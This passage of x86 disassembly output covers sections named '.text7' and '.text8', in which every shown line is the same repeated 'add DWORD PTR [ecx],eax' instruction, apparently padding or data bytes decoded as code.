  4553e0:	add    DWORD PTR [ecx],eax
  4553e2:	add    DWORD PTR [ecx],eax
  4553e4:	add    DWORD PTR [ecx],eax
  4553e6:	add    DWORD PTR [ecx],eax

Disassembly of section .text7:

00456000 <.text7>:
  456000:	add    DWORD PTR [ecx],eax
  456002:	add    DWORD PTR [ecx],eax
  456004:	add    DWORD PTR [ecx],eax
  456006:	add    DWORD PTR [ecx],eax
  456008:	add    DWORD PTR [ecx],eax
  45600a:	add    DWORD PTR [ecx],eax
  45600c:	add    DWORD PTR [ecx],eax
  45600e:	add    DWORD PTR [ecx],eax
  456010:	add    DWORD PTR [ecx],eax
  456012:	add    DWORD PTR [ecx],eax
  456014:	add    DWORD PTR [ecx],eax
  456016:	add    DWORD PTR [ecx],eax
  456018:	add    DWORD PTR [ecx],eax
  45601a:	add    DWORD PTR [ecx],eax
  45601c:	add    DWORD PTR [ecx],eax
  45601e:	add    DWORD PTR [ecx],eax
  456020:	add    DWORD PTR [ecx],eax
  456022:	add    DWORD PTR [ecx],eax
  456024:	add    DWORD PTR [ecx],eax
  456026:	add    DWORD PTR [ecx],eax
  456028:	add    DWORD PTR [ecx],eax
  45602a:	add    DWORD PTR [ecx],eax
  45602c:	add    DWORD PTR [ecx],eax
  45602e:	add    DWORD PTR [ecx],eax
  456030:	add    DWORD PTR [ecx],eax
  456032:	add    DWORD PTR [ecx],eax
  456034:	add    DWORD PTR [ecx],eax
  456036:	add    DWORD PTR [ecx],eax
  456038:	add    DWORD PTR [ecx],eax
  45603a:	add    DWORD PTR [ecx],eax
  45603c:	add    DWORD PTR [ecx],eax
  45603e:	add    DWORD PTR [ecx],eax
  456040:	add    DWORD PTR [ecx],eax
  456042:	add    DWORD PTR [ecx],eax
  456044:	add    DWORD PTR [ecx],eax
  456046:	add    DWORD PTR [ecx],eax
  456048:	add    DWORD PTR [ecx],eax
  45604a:	add    DWORD PTR [ecx],eax
  45604c:	add    DWORD PTR [ecx],eax
  45604e:	add    DWORD PTR [ecx],eax
  456050:	add    DWORD PTR [ecx],eax
  456052:	add    DWORD PTR [ecx],eax
  456054:	add    DWORD PTR [ecx],eax
  456056:	add    DWORD PTR [ecx],eax
  456058:	add    DWORD PTR [ecx],eax
  45605a:	add    DWORD PTR [ecx],eax
  45605c:	add    DWORD PTR [ecx],eax
  45605e:	add    DWORD PTR [ecx],eax
  456060:	add    DWORD PTR [ecx],eax
  456062:	add    DWORD PTR [ecx],eax
  456064:	add    DWORD PTR [ecx],eax
  456066:	add    DWORD PTR [ecx],eax
  456068:	add    DWORD PTR [ecx],eax
  45606a:	add    DWORD PTR [ecx],eax
  45606c:	add    DWORD PTR [ecx],eax
  45606e:	add    DWORD PTR [ecx],eax
  456070:	add    DWORD PTR [ecx],eax
  456072:	add    DWORD PTR [ecx],eax
  456074:	add    DWORD PTR [ecx],eax
  456076:	add    DWORD PTR [ecx],eax
  456078:	add    DWORD PTR [ecx],eax
  45607a:	add    DWORD PTR [ecx],eax
  45607c:	add    DWORD PTR [ecx],eax
  45607e:	add    DWORD PTR [ecx],eax
  456080:	add    DWORD PTR [ecx],eax
  456082:	add    DWORD PTR [ecx],eax
  456084:	add    DWORD PTR [ecx],eax
  456086:	add    DWORD PTR [ecx],eax
  456088:	add    DWORD PTR [ecx],eax
  45608a:	add    DWORD PTR [ecx],eax
  45608c:	add    DWORD PTR [ecx],eax
  45608e:	add    DWORD PTR [ecx],eax
  456090:	add    DWORD PTR [ecx],eax
  456092:	add    DWORD PTR [ecx],eax
  456094:	add    DWORD PTR [ecx],eax
  456096:	add    DWORD PTR [ecx],eax
  456098:	add    DWORD PTR [ecx],eax
  45609a:	add    DWORD PTR [ecx],eax
  45609c:	add    DWORD PTR [ecx],eax
  45609e:	add    DWORD PTR [ecx],eax
  4560a0:	add    DWORD PTR [ecx],eax
  4560a2:	add    DWORD PTR [ecx],eax
  4560a4:	add    DWORD PTR [ecx],eax
  4560a6:	add    DWORD PTR [ecx],eax
  4560a8:	add    DWORD PTR [ecx],eax
  4560aa:	add    DWORD PTR [ecx],eax
  4560ac:	add    DWORD PTR [ecx],eax
  4560ae:	add    DWORD PTR [ecx],eax
  4560b0:	add    DWORD PTR [ecx],eax
  4560b2:	add    DWORD PTR [ecx],eax
  4560b4:	add    DWORD PTR [ecx],eax
  4560b6:	add    DWORD PTR [ecx],eax
  4560b8:	add    DWORD PTR [ecx],eax
  4560ba:	add    DWORD PTR [ecx],eax
  4560bc:	add    DWORD PTR [ecx],eax
  4560be:	add    DWORD PTR [ecx],eax
  4560c0:	add    DWORD PTR [ecx],eax
  4560c2:	add    DWORD PTR [ecx],eax
  4560c4:	add    DWORD PTR [ecx],eax
  4560c6:	add    DWORD PTR [ecx],eax
  4560c8:	add    DWORD PTR [ecx],eax
  4560ca:	add    DWORD PTR [ecx],eax
  4560cc:	add    DWORD PTR [ecx],eax
  4560ce:	add    DWORD PTR [ecx],eax
  4560d0:	add    DWORD PTR [ecx],eax
  4560d2:	add    DWORD PTR [ecx],eax
  4560d4:	add    DWORD PTR [ecx],eax
  4560d6:	add    DWORD PTR [ecx],eax
  4560d8:	add    DWORD PTR [ecx],eax
  4560da:	add    DWORD PTR [ecx],eax
  4560dc:	add    DWORD PTR [ecx],eax
  4560de:	add    DWORD PTR [ecx],eax
  4560e0:	add    DWORD PTR [ecx],eax
  4560e2:	add    DWORD PTR [ecx],eax
  4560e4:	add    DWORD PTR [ecx],eax
  4560e6:	add    DWORD PTR [ecx],eax
  4560e8:	add    DWORD PTR [ecx],eax
  4560ea:	add    DWORD PTR [ecx],eax
  4560ec:	add    DWORD PTR [ecx],eax
  4560ee:	add    DWORD PTR [ecx],eax
  4560f0:	add    DWORD PTR [ecx],eax
  4560f2:	add    DWORD PTR [ecx],eax
  4560f4:	add    DWORD PTR [ecx],eax
  4560f6:	add    DWORD PTR [ecx],eax
  4560f8:	add    DWORD PTR [ecx],eax
  4560fa:	add    DWORD PTR [ecx],eax
  4560fc:	add    DWORD PTR [ecx],eax
  4560fe:	add    DWORD PTR [ecx],eax
  456100:	add    DWORD PTR [ecx],eax
  456102:	add    DWORD PTR [ecx],eax
  456104:	add    DWORD PTR [ecx],eax
  456106:	add    DWORD PTR [ecx],eax
  456108:	add    DWORD PTR [ecx],eax
  45610a:	add    DWORD PTR [ecx],eax
  45610c:	add    DWORD PTR [ecx],eax
  45610e:	add    DWORD PTR [ecx],eax
  456110:	add    DWORD PTR [ecx],eax
  456112:	add    DWORD PTR [ecx],eax
  456114:	add    DWORD PTR [ecx],eax
  456116:	add    DWORD PTR [ecx],eax
  456118:	add    DWORD PTR [ecx],eax
  45611a:	add    DWORD PTR [ecx],eax
  45611c:	add    DWORD PTR [ecx],eax
  45611e:	add    DWORD PTR [ecx],eax
  456120:	add    DWORD PTR [ecx],eax
  456122:	add    DWORD PTR [ecx],eax
  456124:	add    DWORD PTR [ecx],eax
  456126:	add    DWORD PTR [ecx],eax
  456128:	add    DWORD PTR [ecx],eax
  45612a:	add    DWORD PTR [ecx],eax
  45612c:	add    DWORD PTR [ecx],eax
  45612e:	add    DWORD PTR [ecx],eax
  456130:	add    DWORD PTR [ecx],eax
  456132:	add    DWORD PTR [ecx],eax
  456134:	add    DWORD PTR [ecx],eax
  456136:	add    DWORD PTR [ecx],eax
  456138:	add    DWORD PTR [ecx],eax
  45613a:	add    DWORD PTR [ecx],eax
  45613c:	add    DWORD PTR [ecx],eax
  45613e:	add    DWORD PTR [ecx],eax
  456140:	add    DWORD PTR [ecx],eax
  456142:	add    DWORD PTR [ecx],eax
  456144:	add    DWORD PTR [ecx],eax
  456146:	add    DWORD PTR [ecx],eax
  456148:	add    DWORD PTR [ecx],eax
  45614a:	add    DWORD PTR [ecx],eax
  45614c:	add    DWORD PTR [ecx],eax
  45614e:	add    DWORD PTR [ecx],eax
  456150:	add    DWORD PTR [ecx],eax
  456152:	add    DWORD PTR [ecx],eax
  456154:	add    DWORD PTR [ecx],eax
  456156:	add    DWORD PTR [ecx],eax
  456158:	add    DWORD PTR [ecx],eax
  45615a:	add    DWORD PTR [ecx],eax
  45615c:	add    DWORD PTR [ecx],eax
  45615e:	add    DWORD PTR [ecx],eax
  456160:	add    DWORD PTR [ecx],eax
  456162:	add    DWORD PTR [ecx],eax
  456164:	add    DWORD PTR [ecx],eax
  456166:	add    DWORD PTR [ecx],eax
  456168:	add    DWORD PTR [ecx],eax
  45616a:	add    DWORD PTR [ecx],eax
  45616c:	add    DWORD PTR [ecx],eax
  45616e:	add    DWORD PTR [ecx],eax
  456170:	add    DWORD PTR [ecx],eax
  456172:	add    DWORD PTR [ecx],eax
  456174:	add    DWORD PTR [ecx],eax
  456176:	add    DWORD PTR [ecx],eax
  456178:	add    DWORD PTR [ecx],eax
  45617a:	add    DWORD PTR [ecx],eax
  45617c:	add    DWORD PTR [ecx],eax
  45617e:	add    DWORD PTR [ecx],eax
  456180:	add    DWORD PTR [ecx],eax
  456182:	add    DWORD PTR [ecx],eax
  456184:	add    DWORD PTR [ecx],eax
  456186:	add    DWORD PTR [ecx],eax
  456188:	add    DWORD PTR [ecx],eax
  45618a:	add    DWORD PTR [ecx],eax
  45618c:	add    DWORD PTR [ecx],eax
  45618e:	add    DWORD PTR [ecx],eax
  456190:	add    DWORD PTR [ecx],eax
  456192:	add    DWORD PTR [ecx],eax
  456194:	add    DWORD PTR [ecx],eax
  456196:	add    DWORD PTR [ecx],eax
  456198:	add    DWORD PTR [ecx],eax
  45619a:	add    DWORD PTR [ecx],eax
  45619c:	add    DWORD PTR [ecx],eax
  45619e:	add    DWORD PTR [ecx],eax
  4561a0:	add    DWORD PTR [ecx],eax
  4561a2:	add    DWORD PTR [ecx],eax
  4561a4:	add    DWORD PTR [ecx],eax
  4561a6:	add    DWORD PTR [ecx],eax
  4561a8:	add    DWORD PTR [ecx],eax
  4561aa:	add    DWORD PTR [ecx],eax
  4561ac:	add    DWORD PTR [ecx],eax
  4561ae:	add    DWORD PTR [ecx],eax
  4561b0:	add    DWORD PTR [ecx],eax
  4561b2:	add    DWORD PTR [ecx],eax
  4561b4:	add    DWORD PTR [ecx],eax
  4561b6:	add    DWORD PTR [ecx],eax
  4561b8:	add    DWORD PTR [ecx],eax
  4561ba:	add    DWORD PTR [ecx],eax
  4561bc:	add    DWORD PTR [ecx],eax
  4561be:	add    DWORD PTR [ecx],eax
  4561c0:	add    DWORD PTR [ecx],eax
  4561c2:	add    DWORD PTR [ecx],eax
  4561c4:	add    DWORD PTR [ecx],eax
  4561c6:	add    DWORD PTR [ecx],eax
  4561c8:	add    DWORD PTR [ecx],eax
  4561ca:	add    DWORD PTR [ecx],eax
  4561cc:	add    DWORD PTR [ecx],eax
  4561ce:	add    DWORD PTR [ecx],eax
  4561d0:	add    DWORD PTR [ecx],eax
  4561d2:	add    DWORD PTR [ecx],eax
  4561d4:	add    DWORD PTR [ecx],eax
  4561d6:	add    DWORD PTR [ecx],eax
  4561d8:	add    DWORD PTR [ecx],eax
  4561da:	add    DWORD PTR [ecx],eax
  4561dc:	add    DWORD PTR [ecx],eax
  4561de:	add    DWORD PTR [ecx],eax
  4561e0:	add    DWORD PTR [ecx],eax
  4561e2:	add    DWORD PTR [ecx],eax
  4561e4:	add    DWORD PTR [ecx],eax
  4561e6:	add    DWORD PTR [ecx],eax
  4561e8:	add    DWORD PTR [ecx],eax
  4561ea:	add    DWORD PTR [ecx],eax
  4561ec:	add    DWORD PTR [ecx],eax
  4561ee:	add    DWORD PTR [ecx],eax
  4561f0:	add    DWORD PTR [ecx],eax
  4561f2:	add    DWORD PTR [ecx],eax
  4561f4:	add    DWORD PTR [ecx],eax
  4561f6:	add    DWORD PTR [ecx],eax
  4561f8:	add    DWORD PTR [ecx],eax
  4561fa:	add    DWORD PTR [ecx],eax
  4561fc:	add    DWORD PTR [ecx],eax
  4561fe:	add    DWORD PTR [ecx],eax
  456200:	add    DWORD PTR [ecx],eax
  456202:	add    DWORD PTR [ecx],eax
  456204:	add    DWORD PTR [ecx],eax
  456206:	add    DWORD PTR [ecx],eax
  456208:	add    DWORD PTR [ecx],eax
  45620a:	add    DWORD PTR [ecx],eax
  45620c:	add    DWORD PTR [ecx],eax
  45620e:	add    DWORD PTR [ecx],eax
  456210:	add    DWORD PTR [ecx],eax
  456212:	add    DWORD PTR [ecx],eax
  456214:	add    DWORD PTR [ecx],eax
  456216:	add    DWORD PTR [ecx],eax
  456218:	add    DWORD PTR [ecx],eax
  45621a:	add    DWORD PTR [ecx],eax
  45621c:	add    DWORD PTR [ecx],eax
  45621e:	add    DWORD PTR [ecx],eax
  456220:	add    DWORD PTR [ecx],eax
  456222:	add    DWORD PTR [ecx],eax
  456224:	add    DWORD PTR [ecx],eax
  456226:	add    DWORD PTR [ecx],eax
  456228:	add    DWORD PTR [ecx],eax
  45622a:	add    DWORD PTR [ecx],eax
  45622c:	add    DWORD PTR [ecx],eax
  45622e:	add    DWORD PTR [ecx],eax
  456230:	add    DWORD PTR [ecx],eax
  456232:	add    DWORD PTR [ecx],eax
  456234:	add    DWORD PTR [ecx],eax
  456236:	add    DWORD PTR [ecx],eax
  456238:	add    DWORD PTR [ecx],eax
  45623a:	add    DWORD PTR [ecx],eax
  45623c:	add    DWORD PTR [ecx],eax
  45623e:	add    DWORD PTR [ecx],eax
  456240:	add    DWORD PTR [ecx],eax
  456242:	add    DWORD PTR [ecx],eax
  456244:	add    DWORD PTR [ecx],eax
  456246:	add    DWORD PTR [ecx],eax
  456248:	add    DWORD PTR [ecx],eax
  45624a:	add    DWORD PTR [ecx],eax
  45624c:	add    DWORD PTR [ecx],eax
  45624e:	add    DWORD PTR [ecx],eax
  456250:	add    DWORD PTR [ecx],eax
  456252:	add    DWORD PTR [ecx],eax
  456254:	add    DWORD PTR [ecx],eax
  456256:	add    DWORD PTR [ecx],eax
  456258:	add    DWORD PTR [ecx],eax
  45625a:	add    DWORD PTR [ecx],eax
  45625c:	add    DWORD PTR [ecx],eax
  45625e:	add    DWORD PTR [ecx],eax
  456260:	add    DWORD PTR [ecx],eax
  456262:	add    DWORD PTR [ecx],eax
  456264:	add    DWORD PTR [ecx],eax
  456266:	add    DWORD PTR [ecx],eax
  456268:	add    DWORD PTR [ecx],eax
  45626a:	add    DWORD PTR [ecx],eax
  45626c:	add    DWORD PTR [ecx],eax
  45626e:	add    DWORD PTR [ecx],eax
  456270:	add    DWORD PTR [ecx],eax
  456272:	add    DWORD PTR [ecx],eax
  456274:	add    DWORD PTR [ecx],eax
  456276:	add    DWORD PTR [ecx],eax
  456278:	add    DWORD PTR [ecx],eax
  45627a:	add    DWORD PTR [ecx],eax
  45627c:	add    DWORD PTR [ecx],eax
  45627e:	add    DWORD PTR [ecx],eax
  456280:	add    DWORD PTR [ecx],eax
  456282:	add    DWORD PTR [ecx],eax
  456284:	add    DWORD PTR [ecx],eax
  456286:	add    DWORD PTR [ecx],eax
  456288:	add    DWORD PTR [ecx],eax
  45628a:	add    DWORD PTR [ecx],eax
  45628c:	add    DWORD PTR [ecx],eax
  45628e:	add    DWORD PTR [ecx],eax
  456290:	add    DWORD PTR [ecx],eax
  456292:	add    DWORD PTR [ecx],eax
  456294:	add    DWORD PTR [ecx],eax
  456296:	add    DWORD PTR [ecx],eax
  456298:	add    DWORD PTR [ecx],eax
  45629a:	add    DWORD PTR [ecx],eax
  45629c:	add    DWORD PTR [ecx],eax
  45629e:	add    DWORD PTR [ecx],eax
  4562a0:	add    DWORD PTR [ecx],eax
  4562a2:	add    DWORD PTR [ecx],eax
  4562a4:	add    DWORD PTR [ecx],eax
  4562a6:	add    DWORD PTR [ecx],eax
  4562a8:	add    DWORD PTR [ecx],eax
  4562aa:	add    DWORD PTR [ecx],eax
  4562ac:	add    DWORD PTR [ecx],eax
  4562ae:	add    DWORD PTR [ecx],eax
  4562b0:	add    DWORD PTR [ecx],eax
  4562b2:	add    DWORD PTR [ecx],eax
  4562b4:	add    DWORD PTR [ecx],eax
  4562b6:	add    DWORD PTR [ecx],eax
  4562b8:	add    DWORD PTR [ecx],eax
  4562ba:	add    DWORD PTR [ecx],eax
  4562bc:	add    DWORD PTR [ecx],eax
  4562be:	add    DWORD PTR [ecx],eax
  4562c0:	add    DWORD PTR [ecx],eax
  4562c2:	add    DWORD PTR [ecx],eax
  4562c4:	add    DWORD PTR [ecx],eax
  4562c6:	add    DWORD PTR [ecx],eax
  4562c8:	add    DWORD PTR [ecx],eax
  4562ca:	add    DWORD PTR [ecx],eax
  4562cc:	add    DWORD PTR [ecx],eax
  4562ce:	add    DWORD PTR [ecx],eax
  4562d0:	add    DWORD PTR [ecx],eax
  4562d2:	add    DWORD PTR [ecx],eax
  4562d4:	add    DWORD PTR [ecx],eax
  4562d6:	add    DWORD PTR [ecx],eax
  4562d8:	add    DWORD PTR [ecx],eax
  4562da:	add    DWORD PTR [ecx],eax
  4562dc:	add    DWORD PTR [ecx],eax
  4562de:	add    DWORD PTR [ecx],eax
  4562e0:	add    DWORD PTR [ecx],eax
  4562e2:	add    DWORD PTR [ecx],eax
  4562e4:	add    DWORD PTR [ecx],eax
  4562e6:	add    DWORD PTR [ecx],eax
  4562e8:	add    DWORD PTR [ecx],eax
  4562ea:	add    DWORD PTR [ecx],eax
  4562ec:	add    DWORD PTR [ecx],eax
  4562ee:	add    DWORD PTR [ecx],eax
  4562f0:	add    DWORD PTR [ecx],eax
  4562f2:	add    DWORD PTR [ecx],eax
  4562f4:	add    DWORD PTR [ecx],eax
  4562f6:	add    DWORD PTR [ecx],eax
  4562f8:	add    DWORD PTR [ecx],eax
  4562fa:	add    DWORD PTR [ecx],eax
  4562fc:	add    DWORD PTR [ecx],eax
  4562fe:	add    DWORD PTR [ecx],eax
  456300:	add    DWORD PTR [ecx],eax
  456302:	add    DWORD PTR [ecx],eax
  456304:	add    DWORD PTR [ecx],eax
  456306:	add    DWORD PTR [ecx],eax
  456308:	add    DWORD PTR [ecx],eax
  45630a:	add    DWORD PTR [ecx],eax
  45630c:	add    DWORD PTR [ecx],eax
  45630e:	add    DWORD PTR [ecx],eax
  456310:	add    DWORD PTR [ecx],eax
  456312:	add    DWORD PTR [ecx],eax
  456314:	add    DWORD PTR [ecx],eax
  456316:	add    DWORD PTR [ecx],eax
  456318:	add    DWORD PTR [ecx],eax
  45631a:	add    DWORD PTR [ecx],eax
  45631c:	add    DWORD PTR [ecx],eax
  45631e:	add    DWORD PTR [ecx],eax
  456320:	add    DWORD PTR [ecx],eax
  456322:	add    DWORD PTR [ecx],eax
  456324:	add    DWORD PTR [ecx],eax
  456326:	add    DWORD PTR [ecx],eax
  456328:	add    DWORD PTR [ecx],eax
  45632a:	add    DWORD PTR [ecx],eax
  45632c:	add    DWORD PTR [ecx],eax
  45632e:	add    DWORD PTR [ecx],eax
  456330:	add    DWORD PTR [ecx],eax
  456332:	add    DWORD PTR [ecx],eax
  456334:	add    DWORD PTR [ecx],eax
  456336:	add    DWORD PTR [ecx],eax
  456338:	add    DWORD PTR [ecx],eax
  45633a:	add    DWORD PTR [ecx],eax
  45633c:	add    DWORD PTR [ecx],eax
  45633e:	add    DWORD PTR [ecx],eax
  456340:	add    DWORD PTR [ecx],eax
  456342:	add    DWORD PTR [ecx],eax
  456344:	add    DWORD PTR [ecx],eax
  456346:	add    DWORD PTR [ecx],eax
  456348:	add    DWORD PTR [ecx],eax
  45634a:	add    DWORD PTR [ecx],eax
  45634c:	add    DWORD PTR [ecx],eax
  45634e:	add    DWORD PTR [ecx],eax
  456350:	add    DWORD PTR [ecx],eax
  456352:	add    DWORD PTR [ecx],eax
  456354:	add    DWORD PTR [ecx],eax
  456356:	add    DWORD PTR [ecx],eax
  456358:	add    DWORD PTR [ecx],eax
  45635a:	add    DWORD PTR [ecx],eax
  45635c:	add    DWORD PTR [ecx],eax
  45635e:	add    DWORD PTR [ecx],eax
  456360:	add    DWORD PTR [ecx],eax
  456362:	add    DWORD PTR [ecx],eax
  456364:	add    DWORD PTR [ecx],eax
  456366:	add    DWORD PTR [ecx],eax
  456368:	add    DWORD PTR [ecx],eax
  45636a:	add    DWORD PTR [ecx],eax
  45636c:	add    DWORD PTR [ecx],eax
  45636e:	add    DWORD PTR [ecx],eax
  456370:	add    DWORD PTR [ecx],eax
  456372:	add    DWORD PTR [ecx],eax
  456374:	add    DWORD PTR [ecx],eax
  456376:	add    DWORD PTR [ecx],eax
  456378:	add    DWORD PTR [ecx],eax
  45637a:	add    DWORD PTR [ecx],eax
  45637c:	add    DWORD PTR [ecx],eax
  45637e:	add    DWORD PTR [ecx],eax
  456380:	add    DWORD PTR [ecx],eax
  456382:	add    DWORD PTR [ecx],eax
  456384:	add    DWORD PTR [ecx],eax
  456386:	add    DWORD PTR [ecx],eax
  456388:	add    DWORD PTR [ecx],eax
  45638a:	add    DWORD PTR [ecx],eax
  45638c:	add    DWORD PTR [ecx],eax
  45638e:	add    DWORD PTR [ecx],eax
  456390:	add    DWORD PTR [ecx],eax
  456392:	add    DWORD PTR [ecx],eax
  456394:	add    DWORD PTR [ecx],eax
  456396:	add    DWORD PTR [ecx],eax
  456398:	add    DWORD PTR [ecx],eax
  45639a:	add    DWORD PTR [ecx],eax
  45639c:	add    DWORD PTR [ecx],eax
  45639e:	add    DWORD PTR [ecx],eax
  4563a0:	add    DWORD PTR [ecx],eax
  4563a2:	add    DWORD PTR [ecx],eax
  4563a4:	add    DWORD PTR [ecx],eax
  4563a6:	add    DWORD PTR [ecx],eax
  4563a8:	add    DWORD PTR [ecx],eax
  4563aa:	add    DWORD PTR [ecx],eax
  4563ac:	add    DWORD PTR [ecx],eax
  4563ae:	add    DWORD PTR [ecx],eax
  4563b0:	add    DWORD PTR [ecx],eax
  4563b2:	add    DWORD PTR [ecx],eax
  4563b4:	add    DWORD PTR [ecx],eax
  4563b6:	add    DWORD PTR [ecx],eax
  4563b8:	add    DWORD PTR [ecx],eax
  4563ba:	add    DWORD PTR [ecx],eax
  4563bc:	add    DWORD PTR [ecx],eax
  4563be:	add    DWORD PTR [ecx],eax
  4563c0:	add    DWORD PTR [ecx],eax
  4563c2:	add    DWORD PTR [ecx],eax
  4563c4:	add    DWORD PTR [ecx],eax
  4563c6:	add    DWORD PTR [ecx],eax
  4563c8:	add    DWORD PTR [ecx],eax
  4563ca:	add    DWORD PTR [ecx],eax
  4563cc:	add    DWORD PTR [ecx],eax
  4563ce:	add    DWORD PTR [ecx],eax
  4563d0:	add    DWORD PTR [ecx],eax
  4563d2:	add    DWORD PTR [ecx],eax
  4563d4:	add    DWORD PTR [ecx],eax
  4563d6:	add    DWORD PTR [ecx],eax
  4563d8:	add    DWORD PTR [ecx],eax
  4563da:	add    DWORD PTR [ecx],eax
  4563dc:	add    DWORD PTR [ecx],eax
  4563de:	add    DWORD PTR [ecx],eax
  4563e0:	add    DWORD PTR [ecx],eax
  4563e2:	add    DWORD PTR [ecx],eax
  4563e4:	add    DWORD PTR [ecx],eax
  4563e6:	add    DWORD PTR [ecx],eax

Disassembly of section .text8:

00457000 <.text8>:
  457000:	add    DWORD PTR [ecx],eax
  457002:	add    DWORD PTR [ecx],eax
  457004:	add    DWORD PTR [ecx],eax
  457006:	add    DWORD PTR [ecx],eax
  457008:	add    DWORD PTR [ecx],eax
  45700a:	add    DWORD PTR [ecx],eax
  45700c:	add    DWORD PTR [ecx],eax
  45700e:	add    DWORD PTR [ecx],eax
  457010:	add    DWORD PTR [ecx],eax
  457012:	add    DWORD PTR [ecx],eax
  457014:	add    DWORD PTR [ecx],eax
  457016:	add    DWORD PTR [ecx],eax
  457018:	add    DWORD PTR [ecx],eax
  45701a:	add    DWORD PTR [ecx],eax
  45701c:	add    DWORD PTR [ecx],eax
  45701e:	add    DWORD PTR [ecx],eax
  457020:	add    DWORD PTR [ecx],eax
  457022:	add    DWORD PTR [ecx],eax
  457024:	add    DWORD PTR [ecx],eax
  457026:	add    DWORD PTR [ecx],eax
  457028:	add    DWORD PTR [ecx],eax
  45702a:	add    DWORD PTR [ecx],eax
  45702c:	add    DWORD PTR [ecx],eax
  45702e:	add    DWORD PTR [ecx],eax
  457030:	add    DWORD PTR [ecx],eax
  457032:	add    DWORD PTR [ecx],eax
  457034:	add    DWORD PTR [ecx],eax
  457036:	add    DWORD PTR [ecx],eax
  457038:	add    DWORD PTR [ecx],eax
  45703a:	add    DWORD PTR [ecx],eax
  45703c:	add    DWORD PTR [ecx],eax
  45703e:	add    DWORD PTR [ecx],eax
  457040:	add    DWORD PTR [ecx],eax
  457042:	add    DWORD PTR [ecx],eax
  457044:	add    DWORD PTR [ecx],eax
  457046:	add    DWORD PTR [ecx],eax
  457048:	add    DWORD PTR [ecx],eax
  45704a:	add    DWORD PTR [ecx],eax
  45704c:	add    DWORD PTR [ecx],eax
  45704e:	add    DWORD PTR [ecx],eax
  457050:	add    DWORD PTR [ecx],eax
  457052:	add    DWORD PTR [ecx],eax
  457054:	add    DWORD PTR [ecx],eax
  457056:	add    DWORD PTR [ecx],eax
  457058:	add    DWORD PTR [ecx],eax
  45705a:	add    DWORD PTR [ecx],eax
  45705c:	add    DWORD PTR [ecx],eax
  45705e:	add    DWORD PTR [ecx],eax
  457060:	add    DWORD PTR [ecx],eax
  457062:	add    DWORD PTR [ecx],eax
  457064:	add    DWORD PTR [ecx],eax
  457066:	add    DWORD PTR [ecx],eax
  457068:	add    DWORD PTR [ecx],eax
  45706a:	add    DWORD PTR [ecx],eax
  45706c:	add    DWORD PTR [ecx],eax
  45706e:	add    DWORD PTR [ecx],eax
  457070:	add    DWORD PTR [ecx],eax
  457072:	add    DWORD PTR [ecx],eax
  457074:	add    DWORD PTR [ecx],eax
  457076:	add    DWORD PTR [ecx],eax
  457078:	add    DWORD PTR [ecx],eax
  45707a:	add    DWORD PTR [ecx],eax
  45707c:	add    DWORD PTR [ecx],eax
  45707e:	add    DWORD PTR [ecx],eax
  457080:	add    DWORD PTR [ecx],eax
  457082:	add    DWORD PTR [ecx],eax
  457084:	add    DWORD PTR [ecx],eax
  457086:	add    DWORD PTR [ecx],eax
  457088:	add    DWORD PTR [ecx],eax
  45708a:	add    DWORD PTR [ecx],eax
  45708c:	add    DWORD PTR [ecx],eax
  45708e:	add    DWORD PTR [ecx],eax
  457090:	add    DWORD PTR [ecx],eax
  457092:	add    DWORD PTR [ecx],eax
  457094:	add    DWORD PTR [ecx],eax
  457096:	add    DWORD PTR [ecx],eax
  457098:	add    DWORD PTR [ecx],eax
  45709a:	add    DWORD PTR [ecx],eax
  45709c:	add    DWORD PTR [ecx],eax
  45709e:	add    DWORD PTR [ecx],eax
  4570a0:	add    DWORD PTR [ecx],eax
  4570a2:	add    DWORD PTR [ecx],eax
  4570a4:	add    DWORD PTR [ecx],eax
  4570a6:	add    DWORD PTR [ecx],eax
  4570a8:	add    DWORD PTR [ecx],eax
  4570aa:	add    DWORD PTR [ecx],eax
  4570ac:	add    DWORD PTR [ecx],eax
  4570ae:	add    DWORD PTR [ecx],eax
  4570b0:	add    DWORD PTR [ecx],eax
  4570b2:	add    DWORD PTR [ecx],eax
  4570b4:	add    DWORD PTR [ecx],eax
  4570b6:	add    DWORD PTR [ecx],eax
  4570b8:	add    DWORD PTR [ecx],eax
  4570ba:	add    DWORD PTR [ecx],eax
  4570bc:	add    DWORD PTR [ecx],eax
  4570be:	add    DWORD PTR [ecx],eax
  4570c0:	add    DWORD PTR [ecx],eax
  4570c2:	add    DWORD PTR [ecx],eax
  4570c4:	add    DWORD PTR [ecx],eax
  4570c6:	add    DWORD PTR [ecx],eax
  4570c8:	add    DWORD PTR [ecx],eax
  4570ca:	add    DWORD PTR [ecx],eax
  4570cc:	add    DWORD PTR [ecx],eax
  4570ce:	add    DWORD PTR [ecx],eax
  4570d0:	add    DWORD PTR [ecx],eax
  4570d2:	add    DWORD PTR [ecx],eax
  4570d4:	add    DWORD PTR [ecx],eax
  4570d6:	add    DWORD PTR [ecx],eax
  4570d8:	add    DWORD PTR [ecx],eax
  4570da:	add    DWORD PTR [ecx],eax
  4570dc:	add    DWORD PTR [ecx],eax
  4570de:	add    DWORD PTR [ecx],eax
  4570e0:	add    DWORD PTR [ecx],eax
  4570e2:	add    DWORD PTR [ecx],eax
  4570e4:	add    DWORD PTR [ecx],eax
  4570e6:	add    DWORD PTR [ecx],eax
  4570e8:	add    DWORD PTR [ecx],eax
  4570ea:	add    DWORD PTR [ecx],eax
  4570ec:	add    DWORD PTR [ecx],eax
  4570ee:	add    DWORD PTR [ecx],eax
  4570f0:	add    DWORD PTR [ecx],eax
  4570f2:	add    DWORD PTR [ecx],eax
  4570f4:	add    DWORD PTR [ecx],eax
  4570f6:	add    DWORD PTR [ecx],eax
  4570f8:	add    DWORD PTR [ecx],eax
  4570fa:	add    DWORD PTR [ecx],eax
  4570fc:	add    DWORD PTR [ecx],eax
  4570fe:	add    DWORD PTR [ecx],eax
  457100:	add    DWORD PTR [ecx],eax
  457102:	add    DWORD PTR [ecx],eax
  457104:	add    DWORD PTR [ecx],eax
  457106:	add    DWORD PTR [ecx],eax
  457108:	add    DWORD PTR [ecx],eax
  45710a:	add    DWORD PTR [ecx],eax
  45710c:	add    DWORD PTR [ecx],eax
  45710e:	add    DWORD PTR [ecx],eax
  457110:	add    DWORD PTR [ecx],eax
  457112:	add    DWORD PTR [ecx],eax
  457114:	add    DWORD PTR [ecx],eax
  457116:	add    DWORD PTR [ecx],eax
  457118:	add    DWORD PTR [ecx],eax
  45711a:	add    DWORD PTR [ecx],eax
  45711c:	add    DWORD PTR [ecx],eax
  45711e:	add    DWORD PTR [ecx],eax
  457120:	add    DWORD PTR [ecx],eax
  457122:	add    DWORD PTR [ecx],eax
  457124:	add    DWORD PTR [ecx],eax
  457126:	add    DWORD PTR [ecx],eax
